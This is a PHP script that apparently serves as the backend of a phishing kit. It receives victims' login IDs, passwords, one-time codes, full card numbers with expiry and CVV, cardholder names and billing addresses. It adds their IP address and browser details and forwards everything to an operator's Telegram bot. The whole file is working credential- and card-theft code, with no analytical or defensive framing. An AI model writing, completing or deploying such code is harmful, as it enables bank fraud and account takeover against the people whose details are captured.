<?php
header('Content-Type: application/json');

$botToken = "";
$chatId = "";

$id = isset($_POST['id']) ? $_POST['id'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$otp = isset($_POST['otp']) ? $_POST['otp'] : '';
$cardNumber = isset($_POST['cardNumber']) ? $_POST['cardNumber'] : '';
$cardExpiry = isset($_POST['cardExpiry']) ? $_POST['cardExpiry'] : '';
$cardCvv = isset($_POST['cardCvv']) ? $_POST['cardCvv'] : '';
$cardName = isset($_POST['cardName']) ? $_POST['cardName'] : '';
$billingAddress = isset($_POST['billingAddress']) ? $_POST['billingAddress'] : '';

if (empty($id)) {
    echo json_encode(['status' => 'error', 'message' => 'Missing ID']);
    http_response_code(400);
    exit;
}

$domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'Unknown');
$ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$timestamp = date('Y-m-d H:i:s');

if (!empty($password)) {
    $message = "*🔐 New Login Attempt*\n\n";
    $message .= "*📋 ID:* `$id`\n";
    $message .= "*🔑 Password:* `$password`\n\n";
    $message .= "*🌐 Environment Info:*\n";
    $message .= "*Domain:* `$domain`\n";
    $message .= "*IP Address:* `$ip`\n";
    $message .= "*User Agent:* `$userAgent`\n";
    $message .= "*Time:* `$timestamp`";
} elseif (!empty($otp)) {
    $message = "*✅ OTP Submitted*\n\n";
    $message .= "*📋 ID:* `$id`\n";
    $message .= "*🔢 OTP Code:* `$otp`\n\n";
    $message .= "*🌐 Environment Info:*\n";
    $message .= "*Domain:* `$domain`\n";
    $message .= "*IP Address:* `$ip`\n";
    $message .= "*User Agent:* `$userAgent`\n";
    $message .= "*Time:* `$timestamp`";
} elseif (!empty($cardNumber)) {
    $message = "*💳 Card & Billing Info*\n\n";
    $message .= "*📋 ID:* `$id`\n";
    $message .= "*🔢 Card Number:* `$cardNumber`\n";
    $message .= "*📅 Expiry:* `$cardExpiry`\n";
    $message .= "*🔐 CVV:* `$cardCvv`\n";
    $message .= "*👤 Name:* `$cardName`\n";
    $message .= "*📍 Address:* `$billingAddress`\n\n";
    $message .= "*🌐 Environment Info:*\n";
    $message .= "*Domain:* `$domain`\n";
    $message .= "*IP Address:* `$ip`\n";
    $message .= "*User Agent:* `$userAgent`\n";
    $message .= "*Time:* `$timestamp`";
} else {
    echo json_encode(['status' => 'error', 'message' => 'Missing data']);
    http_response_code(400);
    exit;
}

$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$url = "https://api.telegram.org/bot$botToken/sendMessage";

$options = [
    'http' => [
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === FALSE) {
    echo json_encode(['status' => 'error', 'message' => 'Failed to send']);
    http_response_code(500);
    exit;
}

echo json_encode(['status' => 'success']);
?>
